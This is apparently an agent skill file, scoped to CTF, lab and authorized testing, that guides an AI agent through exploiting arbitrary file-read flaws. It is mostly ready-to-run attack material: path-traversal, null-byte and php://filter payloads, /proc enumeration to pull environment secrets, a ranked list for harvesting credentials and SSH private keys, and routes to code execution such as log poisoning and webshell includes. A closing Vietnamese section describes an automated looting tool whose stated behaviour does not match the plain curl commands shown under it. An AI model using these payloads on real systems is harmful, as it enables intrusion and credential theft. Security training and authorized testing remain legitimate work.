---
name: file-read-primitives
description: >
  Arbitrary file read and source disclosure. Use when any endpoint reads files
  from disk (page/file/download query param, admin file-read API, SSRF with
  file://, XXE, LFI, path traversal, zip traversal, backup tools, /proc access).
  Covers proving the primitive, proc-enum to locate source paths and secrets,
  target hunting, and escalating file-read to RCE (include, php-filter chain,
  log poison, backup restore, INTO OUTFILE).
tags: [file-read, lfi, traversal, source-leak, proc-enum, ssrf, xxe, php-filter, rce]
environment: [ctf, lab, authorized-testing]
budget:
  max_attempts: 5
  stuck_threshold: 3
  time_hint: "35m"
  on_stuck: pivot
  stop_conditions:
    - "cannot read /etc/passwd nor /proc/self after traversal+wrappers+absolute path"
    - "file-read confirmed but no RCE path after exhausting escalation list"
---

# Arbitrary File Read → Foothold

## Scope & Safety
- Only read files on authorized targets. Reading `/etc/shadow`/SSH keys is expected in labs; in real engagements confirm scope before harvesting credentials.
- A file-read primitive is often a stepping stone to RCE — prioritize finding source/config over dumping every file.

## Phase 1: Identify the Primitive
- `?page=`, `?file=`, `?fn=`, `?download=`, `?url=`, `?path=`, `?ebookdownloadurl=` style params
- API body `{"file": "..."}` (admin file-read endpoints), base64url-encoded path
- SSRF (`file:///`, `gopher://`, redirector), XXE (entity → `file://`), zip wrapper
- Backup/restore tools (restic/backy/npbackup read paths as root) — see `references/read-to-rce.md`
- Direct filesystem access from a shell (writable share, group-readable files)

## Phase 2: Prove & Normalize
```bash
# Absolute path
curl 'http://tgt/?page=/etc/passwd'
# Traversal (adjust depth; try absolute first — many apps join wrongly)
curl 'http://tgt/?page=../../../../etc/passwd'
# php filter for source (base64 to survive binary)
curl 'http://tgt/?page=php://filter/convert.base64-encode/resource=index.php'
# Double-encode / null byte if filters strip ../ or append .php
curl 'http://tgt/?page=....//....//etc/passwd'
curl 'http://tgt/?page=../../../../etc/passwd%00'
```
- If output has junk prefix/suffix (echo of param, `<script>window.close()</script>`, base64, binary), clean with `tr '\000' ' '`, `cut`, `base64 -d`, `jq -r`.
- Record whether response is echoed raw vs in JSON — affects scripting.

## Phase 3: proc-enum → locate source & secrets
```bash
# What is this process? where is the app? what user?
curl '.../proc/self/cmdline' | tr '\000' ' '
curl '.../proc/self/environ' | tr '\000' '\n'     # PWD, HOME, API_KEY, APP_MODULE
# Brute PIDs for dotnet/python/apps (ffuf -mr)
ffuf -u 'http://tgt/?page=../../../../proc/FUZZ/cmdline' -w <(seq 1 10000) -mr 'dotnet'
# parent of current proc
curl '.../proc/self/stat'   # 4th field = PPID → read that cmdline
```
- Then read the app source: `app.py`, `main.py`, `config.py`, routes, `deps.py` (auth), cron scripts. Source reveals DB creds, JWT secret, hidden endpoints, filter logic — the fastest path to the next step.

## Phase 4: Target Hunting (in priority order)
1. Source code (from Phase 3) → creds/secret/hidden features
2. `wp-config.php`/`settings.php`/`.env`/`hibernate.cfg` → DB creds → reuse
3. `/home/<user>/.ssh/id_rsa`, `.ssh/authorized_keys`, bash history
4. `/etc/passwd`, `/etc/crontab`, `/var/spool/cron/*`, systemd unit files
5. Backup archives (`/home/*/Documents/backup/*.tar.gz`, `/var/backups/*`) — then extract for creds
6. `/proc/<pid>/environ`, `/proc/net/*`, `/proc/mounts` for secrets/topology
7. Nginx/Apache configs (`/etc/nginx/sites-enabled/*`, `.htpasswd`)

## Phase 5: Escalate Read → RCE
See `references/read-to-rce.md`. Common: include-from-share webshell, log poisoning, php-filter chains, write+reload (uvicorn `--reload`, cron script), backup-restore to read SSH key, `INTO OUTFILE`.

## Decision Tree
- Param reads raw files → Phase 2 → `references/traversal-and-wrappers.md`
- PHP app → try `php://filter` immediately → `references/traversal-and-wrappers.md`
- Can read /proc → Phase 3 → `references/proc-and-source-enum.md`
- Read-only but want RCE → `references/read-to-rce.md`
- Only files under a fixed dir (orders/, backup/) → traversal wrappers / symlink write

## Output Required
- Primitive type + request template that works (raw, absolute/traversal variant)
- Source path found and key secrets extracted
- Any credential/SSH key and what it unlocked
- RCE escalation used (if any)

## References
- `references/traversal-and-wrappers.md` — traversal bypass, php wrappers, XXE/SSRF file read
- `references/proc-and-source-enum.md` — proc enumeration + source review checklist
- `references/read-to-rce.md` — turning file read into code execution

## TOOL SẴN (dùng thay vì gõ từng URL)
```bash
# có primitive đọc file → tự lấy hết file giá trị (URL phải chứa chữ PATH)
curl -G 'http://t/download' --data-urlencode 'file=PATH'
curl -G 'http://t/' --data-urlencode 'page=../../../../etc/passwd'
curl -G 'http://t/g' --data-urlencode 'f=PATH' -H 'Cookie: s=abc'
curl -s 'http://t/read?path=PATH'
```
Tool tự: thử 22 file giá trị theo thứ tự ưu tiên, lọc trang lỗi/404 (không báo nhầm),
lưu vào `loot/`, và **rút username thật từ /etc/passwd** để bạn chạy lại với `/home/<user>/...`.
Không ra gì → đổi `--traversal --depth N` hoặc `--encode url|double|dotdot`.

**Số liệu:** 173/585 box 0xdf (29%) có primitive đọc file tuỳ ý.
**Lấy trước tiên:** `/etc/passwd` (xác nhận primitive + lấy user thật) → `/proc/self/environ`
(cred hay nằm đây) → source app (php://filter) → `/home/<user>/.ssh/id_rsa`.
